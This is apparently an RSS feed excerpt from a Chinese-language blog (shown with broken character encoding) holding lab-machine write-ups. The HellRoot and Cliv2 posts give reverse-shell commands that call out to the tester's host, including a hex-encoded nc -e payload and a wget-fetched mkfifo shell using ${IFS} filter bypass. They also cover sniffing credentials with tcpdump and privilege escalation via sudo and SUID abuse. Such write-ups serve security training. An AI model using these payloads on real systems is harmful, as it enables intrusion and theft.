            <category>CVE-2021-40469</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - HellRoot]]></title>
            <link>https://www.sunsetaction.top/2025/08/02/TheHackersLabsHellRoot</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/08/02/TheHackersLabsHellRoot</guid>
            <pubDate>Sat, 02 Aug 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[HellRoot https://labs.thehackerslabs.com/machine/121 Recon PortScan æ‰«æå‡ºæ¥æœ‰ä¸¤ä¸ª SSH æœåŠ¡ï¼Œä¸‰ä¸ª Web æšä¸¾ 192.168.56.5 æ˜¯ Apache çš„é»˜è®¤é¡µé¢ https://git.hellroot.thl/ æ˜¯ G...]]></description>
            <content:encoded><![CDATA[
# HellRoot

> https://labs.thehackerslabs.com/machine/121
> 

![image.png](/post-images/TheHackersLabsHellRoot/image.png)

## Recon

### PortScan

```bash
âœ  HellRoot nmap -sT -min-rate 10000 -p- 192.168.56.95
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 15:08 CST
Nmap scan report for 192.168.56.95
Host is up (0.00052s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
222/tcp  open  rsh-spx
443/tcp  open  https
5000/tcp open  upnp
MAC Address: 08:00:27:5E:A1:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.73 seconds
```

```bash
âœ  HellRoot nmap -sT -A -p 22,80,222,443,5000 192.168.56.95
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 15:09 CST
Nmap scan report for 192.168.56.95
Host is up (0.00076s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey:
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Apache2 Debian Default Page: It works
222/tcp  open  ssh      OpenSSH 10.0 (protocol 2.0)
443/tcp  open  ssl/http nginx 1.29.0
| ssl-cert: Subject: commonName=git.hellroot.thl
| Not valid before: 2025-07-17T18:18:57
|_Not valid after:  2026-07-17T18:18:57
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-server-header: nginx/1.29.0
|_http-title: Did not follow redirect to https://git.hellroot.thl/
5000/tcp open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Domain Lookup Service
MAC Address: 08:00:27:5E:A1:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.76 ms 192.168.56.95
```

æ‰«æå‡ºæ¥æœ‰ä¸¤ä¸ª `SSH` æœåŠ¡ï¼Œä¸‰ä¸ª `Web`

### æšä¸¾

`192.168.56.5` æ˜¯ `Apache` çš„é»˜è®¤é¡µé¢

![image.png](/post-images/TheHackersLabsHellRoot/image1.png)

`https://git.hellroot.thl/` æ˜¯ `Gitea`

![image.png](/post-images/TheHackersLabsHellRoot/image2.png)

`http://git.hellroot.thl:5000/` æ˜¯åŸŸåè§£æä¸€æ ·çš„ä¸œè¥¿

![image.png](/post-images/TheHackersLabsHellRoot/image3.png)

æµ‹è¯•äº†ä¸€ä¸‹è¿™ä¸ªåŠŸèƒ½ï¼Œè²Œä¼¼æ˜¯ä½¿ç”¨ `dig` æ¥åšåŸŸåè§£æï¼Œä¸è¿‡æˆ‘è¿™é‡Œä½¿ç”¨ä»…ä¸»æœºæ‰€ä»¥æ— æ³•è¿›è¡Œè§£æ

![image.png](/post-images/TheHackersLabsHellRoot/image4.png)

è¿™é‡Œæˆ‘ä¹Ÿå°è¯•äº†å‘½ä»¤æ‹¼æ¥ï¼Œç»è¿‡ç®€å•å°è¯•æ²¡æœ‰å“ªé‡Œå¯ä»¥è¿›è¡Œæ³¨å…¥

æ¥åˆ° `gitea` èƒ½æ‰¾åˆ°ä¸€ä¸ªé¡¹ç›®

![image.png](/post-images/TheHackersLabsHellRoot/image5.png)

å°†å‹ç¼©åŒ…ä¸‹è½½ä¸‹æ¥æ‰“å¼€ï¼Œæ˜¯ `5000` ç«¯å£çš„æºç 

æœ‰ä¸‰ä¸ªæ–‡ä»¶

![image.png](/post-images/TheHackersLabsHellRoot/image6.png)

åœ¨ `Dockerfile` é‡Œé¢èƒ½å‘ç°ä¸€ä¸ªç”¨æˆ·å¯†ç ï¼Œä½†æ˜¯è¿™é‡Œä½¿ç”¨ `SSH` æ— æ³•è¿›è¡Œç™»å½•

```bash
# Create user astro with passwordless sudo access only for /bin/su
RUN useradd -m astro && echo "astro:iloveastro" | chpasswd && \
    echo "astro ALL=(ALL:ALL) NOPASSWD: /bin/su" > /etc/sudoers.d/astro-su && \
    chmod 440 /etc/sudoers.d/astro-su
```

å¹¶ä¸” `222` ç«¯å£åªèƒ½ä½¿ç”¨ç§é’¥è¿›è¡Œç™»å½•

## RCE æ¼æ´

ä¸‹è¾¹æ˜¯`index.php` çš„æºç 

```bash
<main>
  <h1>Domain Lookup Service</h1>
  <form method="POST" action="">
    <label for="domain">Enter Domain</label>
    <input id="domain" name="domain" type="text" placeholder="example.com" required autocomplete="off" />
    <button type="submit">Lookup DNS</button>
  </form>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['domain'])) {
    $input = trim($_POST['domain']);
    $decoded = @hex2bin($input);

    // Always show raw output for debugging
    ob_start();

    if ($decoded !== false && ctype_print($decoded)) {
        if (strpos($decoded, ';') !== false) {
            // Remove header modification that breaks execution
            $output = shell_exec($decoded . ' 2>&1');
        } else {
            $safeDomain = escapeshellarg($decoded);
            $output = shell_exec("nslookup $safeDomain 2>&1");
        }
    } else {
        $safeDomain = escapeshellarg($input);
        $output = shell_exec("nslookup $safeDomain 2>&1");
    }

    echo '<pre class="result">' . htmlspecialchars($output ?: 'No output returned.') . '</pre>';
    ob_end_flush();
}
?>
```

å¾ˆæ˜æ˜¾å­˜åœ¨ä¸€ä¸ª`RCE` æ¼æ´

è¿™é‡Œæ¥æ”¶æˆ‘ä»¬çš„å‚æ•° `domain` ï¼Œç„¶åå¯¹å…¶è¿›è¡Œ`16`è¿›åˆ¶ç¼–ç 

```bash
$input = trim($_POST['domain']);
$decoded = @hex2bin($input);
```

ç„¶åä¸‹è¾¹åˆ¤æ–­è§£ç æ˜¯å¦æˆåŠŸï¼Œå’Œæ˜¯å¦ä¸ºå¯ä»¥æ‰“å°å­—ç¬¦

å‡å¦‚æˆ‘ä»¬ç›´æ¥è¾“å…¥å­—ç¬¦åˆ™è¿›å…¥ `else`

```bash
   if ($decoded !== false && ctype_print($decoded)) {
        if (strpos($decoded, ';') !== false) {
            // Remove header modification that breaks execution
            $output = shell_exec($decoded . ' 2>&1');
        } else {
            $safeDomain = escapeshellarg($decoded);
            $output = shell_exec("nslookup $safeDomain 2>&1");
        }
    } else {
		    // å­—ç¬¦ç›´æ¥è¿›å…¥è¿™é‡Œ
        $safeDomain = escapeshellarg($input);
        $output = shell_exec("nslookup $safeDomain 2>&1");
    }
```

å‡å¦‚æˆ‘ä»¬è¾“å…¥`16`è¿›åˆ¶ï¼Œå¹¶ä¸”è§£ç æˆåŠŸå°±ä¼šè¿›å…¥

```bash
if (strpos($decoded, ';') !== false) {
            // Remove header modification that breaks execution
            $output = shell_exec($decoded . ' 2>&1');
        } else {
            $safeDomain = escapeshellarg($decoded);
            $output = shell_exec("nslookup $safeDomain 2>&1");
        }
```

`$output = shell_exec($decoded . ' 2>&1');` ï¼Œå¦‚æœæ‰¾åˆ°äº†åˆ†å·ï¼Œä»£ç ä¼šç›´æ¥å°†è§£ç åçš„ã€æœªç»ä»»ä½•å¤„ç†çš„å­—ç¬¦ä¸²Â `$decoded`Â ä¼ é€’ç»™Â `shell_exec`Â å‡½æ•°æ‰§è¡Œ

æˆ‘ä»¬å°è¯• `google.com;nc 192.168.56.5 80` ï¼Œç„¶åè½¬æ¢ä¸º `16` è¿›åˆ¶

![image.png](/post-images/TheHackersLabsHellRoot/image7.png)

å‚æ•°å¡«å…¥ `domian` å‚æ•°åæˆåŠŸæ‰§è¡Œ

![image.png](/post-images/TheHackersLabsHellRoot/image8.png)

è¿›è¡Œåå¼¹ `shell`

```bash
google.com;nc 192.168.56.5 1234 -e /bin/bash
// To hex
676f6f676c652e636f6d3b6e63203139322e3136382e35362e352031323334202d65202f62696e2f62617368
```

![image.png](/post-images/TheHackersLabsHellRoot/image9.png)

## ç½‘ç»œå—…æ¢

å½“å‰æˆ‘ä»¬åœ¨ `Docker` ç¯å¢ƒé‡Œé¢

```bash
www-data@05cc10128c04:/home$ ls -la /
total 64
drwxr-xr-x   1 root root 4096 Jul 19 12:49 .
drwxr-xr-x   1 root root 4096 Jul 19 12:49 ..
-rwxr-xr-x   1 root root    0 Jul 19 12:49 .dockerenv
```

æ‰¾åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶

```bash
www-data@05cc10128c04:/var/www/html$ cat sniff.txt 
Puede que haya ciertas herramientas que te permitan esnifar el trafico.
```

> å¯èƒ½å­˜åœ¨æŸäº›å·¥å…·å¯ä»¥è®©ä½ å—…æ¢æµé‡ã€‚
> 

éšè—çš„ `.config` æ–‡ä»¶å¤¹

```bash
www-data@05cc10128c04:/var/www/html/.config$
```

é‡Œé¢æœ‰ `dpkg` çš„ä¿¡æ¯ï¼Œèƒ½çœ‹åˆ°æœ‰ `tcpdump`

![image.png](/post-images/TheHackersLabsHellRoot/image10.png)

ä½¿ç”¨ä¸Šé¢çš„å¾—åˆ°çš„å‡­æ®åˆ‡æ¢ç”¨æˆ·

```bash
www-data@05cc10128c04:/home$ su astro 
Password: 
$ id
uid=1001(astro) gid=1001(astro) groups=1001(astro)
```

å†æ ¹æ® `sudo -l` çš„æƒé™ï¼Œå¯ä»¥ç›´æ¥åˆ‡æ¢åˆ° `root`

```bash
$ sudo -l
Matching Defaults entries for astro on 05cc10128c04:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User astro may run the following commands on 05cc10128c04:
    (ALL : ALL) NOPASSWD: /bin/su
$ sudo su root
root@05cc10128c04:/home# 
```

æˆ‘ä»¬å†æ ¹æ®ä¸Šè¾¹çš„æ–‡ä»¶è¿›è¡Œç½‘ç»œå—…æ¢

![image.png](/post-images/TheHackersLabsHellRoot/image11.png)

ä½†æ˜¯ç›´æ¥æŠ“å¹¶ä¸èƒ½æŠ“åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ï¼Œæƒ³èµ·æ¥ `Gitea` å¯ä»¥è¿›è¡Œç™»å½•

å…ˆæå‰å¼€å¯æŠ“åŒ…ï¼Œç„¶ååœ¨ç½‘ç«™ä¸Šä¸ªä½¿ç”¨å‡­æ®ç™»å½•

```scheme
tcpdump -i eth0 -A -w 1.pcap
```

![image.png](/post-images/TheHackersLabsHellRoot/image12.png)

ç„¶åç›´æ¥æŸ¥çœ‹æ•°æ®åŒ…ï¼Œèƒ½å¾—åˆ°ä¸€ä¸ªå‡­æ®

![image.png](/post-images/TheHackersLabsHellRoot/image13.png)

ä½†ä¸€å¼€å§‹å¹¶æ²¡æƒ³åˆ°è¿™ä¸ªæ˜¯å¯†ç ï¼Œå› ä¸ºæˆ‘è®¤ä¸ºè¿™æ˜¯å‰ç«¯ä¼ è¿‡æ¥åŠ å¯†æ•°æ®

ç„¶ååœ¨ `ssh` è¿›è¡Œå¯†ç ç¢°æ’ï¼ŒæˆåŠŸç™»å½•è¿›å»äº†

![image.png](/post-images/TheHackersLabsHellRoot/image14.png)

èƒ½è¯»å–åˆ° `user.txt`

![image.png](/post-images/TheHackersLabsHellRoot/image15.png)

## æƒé™æå‡

å¯»æ‰¾å­˜åœ¨ `suid` æƒé™çš„ç¨‹åº

```scheme
astro@hellroot:~$ find / -perm -u=s -type f 2>/dev/null
/usr/local/bin/secmonitor
/usr/local/bin/logview
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

æœ‰ä¸¤ä¸ªå¥‡æ€ªçš„ç¨‹åº `logview` å’Œ `secmonitor`

`logview` èƒ½ç›´æ¥è¯»æ–‡ä»¶ï¼Œç›´æ¥è¯» `root.txt`

```scheme
astro@hellroot:~$ logview ../../root/root.txt
[logview] Running with administrative privileges
Displaying log: /var/log/../../root/root.txt
f03xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackersLabs</category>
            <category>Linux</category>
            <category>RCE</category>
            <category>Logview</category>
        </item>
        <item>
            <title><![CDATA[ç¾¤Ué¶æœº - Cliv2]]></title>
            <link>https://www.sunsetaction.top/2025/07/31/ç¾¤Ué¶æœº - Cliv2</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/31/ç¾¤Ué¶æœº - Cliv2</guid>
            <pubDate>Thu, 31 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[ç¾¤Ué¶æœº Cliv2 Recon ç«¯å£æ‰«æ å­åŸŸåçˆ†ç ´ DNS åŒºåŸŸä¼ è¾“æ¼æ´ çœ‹åˆ° dev å°±å¾ˆå…´å¥‹ ç‚¹è¿›å»åçœ‹åˆ° AXFR æˆ‘ä¸€æœï¼Œèƒ½æ‰¾åˆ°ï¼š DNS åŒºåŸŸä¼ è¾“ (AXFR) ä½¿ç”¨ AXFR åè®®çš„ DNS åŒºåŸŸä¼ è¾“æ˜¯è·¨ DNS æœåŠ¡å™¨å¤åˆ¶ DNS è®°å½•çš„æœ€ç®€å•æœºåˆ¶ã€‚ä¸ºé¿å…åœ¨å¤šä¸ª DNS æœåŠ¡å™¨ä¸Šç¼–...]]></description>
            <content:encoded><![CDATA[
# ç¾¤Ué¶æœº - Cliv2

## Recon

ç«¯å£æ‰«æ

```scheme
âœ  Test nmap -sT -min-rate 10000 -p- 192.168.56.100
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 18:37 CST
Nmap scan report for 192.168.56.100
Host is up (0.00018s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
MAC Address: 08:00:27:EB:7B:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

```scheme

âœ  Test nmap -sT -A -p 22,80,53 192.168.56.100     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 18:38 CST
Nmap scan report for cliv2.dsz (192.168.56.100)
Host is up (0.00042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
53/tcp open  domain  ISC BIND 9.16.50 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.16.50-Debian
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: CLIv2 Main
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:EB:7B:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.42 ms cliv2.dsz (192.168.56.100)
```

å­åŸŸåçˆ†ç ´

```scheme
âœ  Test ffuf -u 'http://cliv2.dsz/' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'host: FUZZ.cliv2.dsz' --fs=3669

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cliv2.dsz/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.cliv2.dsz
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 3669
________________________________________________

client                  [Status: 200, Size: 873, Words: 147, Lines: 42, Duration: 0ms]
dev                     [Status: 200, Size: 654, Words: 113, Lines: 34, Duration: 315ms]
```

## DNS åŒºåŸŸä¼ è¾“æ¼æ´

çœ‹åˆ° `dev` å°±å¾ˆå…´å¥‹

ç‚¹è¿›å»åçœ‹åˆ° **`AXFR`**

![image.png](/post-images/ç¾¤Ué¶æœº%20-%20Cliv2/image.png)

æˆ‘ä¸€æœï¼Œèƒ½æ‰¾åˆ°ï¼š

> **DNS åŒºåŸŸä¼ è¾“ (`AXFR`)**
> 
> 
> ä½¿ç”¨ AXFR åè®®çš„ DNS åŒºåŸŸä¼ è¾“æ˜¯è·¨ DNS æœåŠ¡å™¨å¤åˆ¶ DNS è®°å½•çš„æœ€ç®€å•æœºåˆ¶ã€‚ä¸ºé¿å…åœ¨å¤šä¸ª DNS æœåŠ¡å™¨ä¸Šç¼–è¾‘ä¿¡æ¯çš„éœ€è¦ï¼Œæ‚¨å¯ä»¥åœ¨ä¸€å°æœåŠ¡å™¨ä¸Šç¼–è¾‘ä¿¡æ¯å¹¶ä½¿ç”¨ AXFR å°†ä¿¡æ¯å¤åˆ¶åˆ°å…¶ä»–æœåŠ¡å™¨ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ‚¨ä¸ä¿æŠ¤æ‚¨çš„æœåŠ¡å™¨ï¼Œæ¶æ„æ–¹å¯èƒ½ä¼šä½¿ç”¨ AXFR æ¥è·å–æœ‰å…³æ‚¨æ‰€æœ‰ä¸»æœºçš„ä¿¡æ¯ã€‚
> 

é‚£ä¹ˆå®ƒè‚¯å®šæ²¡æœ‰ä¿æŠ¤

```scheme
âœ  Test dig axfr @192.168.56.100  cliv2.dsz 

; <<>> DiG 9.20.9-1-Debian <<>> axfr @192.168.56.100 cliv2.dsz
; (1 server found)
;; global options: +cmd
cliv2.dsz.              86400   IN      SOA     ns1.cliv2.dsz. admin.cliv2.dsz. 2023072601 3600 900 604800 86400
cliv2.dsz.              86400   IN      A       127.0.0.1
cliv2.dsz.              86400   IN      NS      ns1.dsz.
3170a7.cliv2.dsz.       86400   IN      A       127.0.0.1
client.cliv2.dsz.       86400   IN      A       127.0.0.1
dev.cliv2.dsz.          86400   IN      A       127.0.0.1
ns1.cliv2.dsz.          86400   IN      A       127.0.0.1
cliv2.dsz.              86400   IN      SOA     ns1.cliv2.dsz. admin.cliv2.dsz. 2023072601 3600 900 604800 86400
;; Query time: 0 msec
;; SERVER: 192.168.56.100#53(192.168.56.100) (TCP)
;; WHEN: Thu Jul 31 18:58:51 CST 2025
;; XFR size: 8 records (messages 1, bytes 264)
```

## åå¼¹ shell

æœ‰å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½

![image.png](/post-images/ç¾¤Ué¶æœº%20-%20Cliv2/image1.png)

ä¸èƒ½æœ‰ç©ºæ ¼é™åˆ¶ï¼šä¸å…è®¸ä½¿ç”¨ç©ºæ ¼æˆ–è¿å­—ç¬¦ã€‚æœ€å¤§é•¿åº¦ï¼š64 ä¸ªå­—ç¬¦ã€‚

åœ¨ `Kali` å‡†å¤‡æ¶æ„æ–‡ä»¶ï¼Œå¹¶å¼€å¯ `HTTP` æœåŠ¡å™¨

```scheme
âœ  Test cat v.sh 
#!/bin/sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc 192.168.56.5 1234 >/tmp/f
```

é€šè¿‡ä¸¤æ­¥æ¥æ‹¿åˆ° `shell`

```scheme
cmd=cd${IFS}/tmp;busybox${IFS}wget${IFS}192.168.56.5/v.sh;ls${IFS}/tmp
cmd=cd${IFS}/tmp;chmod${IFS}777${IFS}v.sh;./v.sh
```

![image.png](/post-images/ç¾¤Ué¶æœº%20-%20Cliv2/image2.png)

## æƒé™æå‡

`Linpeas.sh` å‘ç° `bitc0de` å®¶ç›®å½•ä¸­æœ‰ä¸€ä¸ª `â€¦`

```scheme
â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching root files in home dirs (limit 30)
/home/
/home/bitc0de/.bash_history
/home/bitc0de/...
/home/bitc0de/user.txt
/root/
/var/www
/var/www/html
/var/www/html/index.html
/var/www/cliv2.dsz
/var/www/cliv2.dsz/index.php
/var/www/3170a7.cliv2.dsz
/var/www/3170a7.cliv2.dsz/index.php
/var/www/client.cliv2.dsz
/var/www/client.cliv2.dsz/index.php
/var/www/dev.cliv2.dsz
/var/www/dev.cliv2.dsz/index.php
```

è¯»å–æ‹¿åˆ°å¯†ç 

```scheme
www-data@Cliv2:/home/bitc0de$ cat ...
MabEwReOmcpG!123
```

åˆ‡æ¢åˆ° `bitc0de` å¹¶æŸ¥çœ‹ `sudo` æƒé™

```scheme

bitc0de@Cliv2:~$ sudo -l
Matching Defaults entries for bitc0de on Cliv2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bitc0de may run the following commands on Cliv2:
    (ALL) NOPASSWD: /usr/local/bin/hmvcli
```

`hmvcli`æ˜¯é€šè¿‡`python`å†™çš„

åˆ†æåå‘ç°å…¶ä¸­æœ‰ä¸€éƒ¨åˆ†ä»£ç æœ‰é—®é¢˜ï¼Œåªè¦å‚æ•°æ˜¯`config` å°±ä¼šè¿è¡Œ `setup.sh`

```scheme
if args['config']:                              
    print("[*] Ejecutando script de configuraciÃ³n...")
    subprocess.run(["bash", "setup.sh"])  
    sys.exit(0) 
```

æ¢­å“ˆ

```scheme
echo "chmod +s /bin/bash" > setup.sh
chmod +x setup.sh
sudo hmvcli --config
```

![image.png](/post-images/ç¾¤Ué¶æœº%20-%20Cliv2/image3.png)


## æ€»ç»“
Qè£™ï¼š660930334]]></content:encoded>
            <category>é¶æœº</category>
            <category>ç¾¤U</category>
            <category>Linux</category>
            <category>DNS</category>
            <category>hvmcli</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Merchan]]></title>
            <link>https://www.sunsetaction.top/2025/07/31/TheHackersLabsMerchan</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/31/TheHackersLabsMerchan</guid>
            <pubDate>Thu, 31 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Merchan https://labs.thehackerslabs.com/machine/109 Recon PortScan Web å­åŸŸå & ç›®å½• çˆ†ç ´ è®¿é—® HTTP ï¼Œè¿™ä¸ªé¡µé¢ä»€ä¹ˆåŠŸèƒ½ç‚¹éƒ½æ²¡æœ‰ å°è¯•çˆ†ç ´ä¸€ä¸‹å­åŸŸåï¼Œåªæœ‰ www ç›®å½•çˆ†ç ´ï¼Œèƒ½æ‰«æå‡ºæ¥ä¸€ä¸ª secret.js è¢«æ··æ·†è¿‡äº†...]]></description>
            <content:encoded><![CDATA[
# Merchan

> https://labs.thehackerslabs.com/machine/109
> 

![image.png](/post-images/TheHackersLabsMerchan/image.png)

## Recon

### PortScan

```bash
âœ  Merchan nmap -sT -min-rate 10000 -p- 192.168.56.99
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 12:48 CST
Nmap scan report for 192.168.56.99
Host is up (0.00078s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:1C:7F:2A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.81 seconds
```

```bash
âœ  Merchan nmap -sT -A -p 22,80 192.168.56.99                                                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 12:49 CST
Nmap scan report for 192.168.56.99
Host is up (0.00048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 da:68:54:15:39:b8:44:ed:b9:08:4c:59:e5:89:50:08 (ECDSA)
|_  256 b4:7d:98:a8:01:e8:3b:17:43:24:43:39:3a:b4:b8:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.62
|_http-title: Did not follow redirect to http://merchan.thl
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:1C:7F:2A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.48 ms 192.168.56.99

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.52 seconds
```

## Web

### å­åŸŸå & ç›®å½• çˆ†ç ´

è®¿é—® `HTTP` ï¼Œè¿™ä¸ªé¡µé¢ä»€ä¹ˆåŠŸèƒ½ç‚¹éƒ½æ²¡æœ‰

![image.png](/post-images/TheHackersLabsMerchan/image1.png)

å°è¯•çˆ†ç ´ä¸€ä¸‹å­åŸŸåï¼Œåªæœ‰ `www`

```bash
âœ  Merchan ffuf -u 'http://merchan.thl/' -H 'host: FUZZ.merchan.thl' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fw=18 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://merchan.thl/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.merchan.thl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 18
________________________________________________

www                     [Status: 200, Size: 7235, Words: 2986, Lines: 131, Duration: 866ms]
:: Progress: [114442/114442] :: Job [1/1] :: 152 req/sec :: Duration: [0:00:54] :: Errors: 0 ::
```

ç›®å½•çˆ†ç ´ï¼Œèƒ½æ‰«æå‡ºæ¥ä¸€ä¸ª `secret.js`

```bash
âœ  Merchan feroxbuster --url http://merchan.thl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x js,txt,zip
...
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      311c http://merchan.thl/images => http://merchan.thl/images/
200      GET        7l       36w      330c http://merchan.thl/js/scripts.js
200      GET    10826l    22299w   236792c http://merchan.thl/css/styles.css
301      GET        9l       28w      311c http://merchan.thl/assets => http://merchan.thl/assets/
301      GET        9l       28w      308c http://merchan.thl/css => http://merchan.thl/css/
301      GET        9l       28w      307c http://merchan.thl/js => http://merchan.thl/js/
200      GET        8l       29w    28898c http://merchan.thl/assets/favicon.ico
200      GET      563l     3920w   380306c http://merchan.thl/images/sudadera.png
200      GET      139l      592w    68236c http://merchan.thl/images/camiseta.jpg
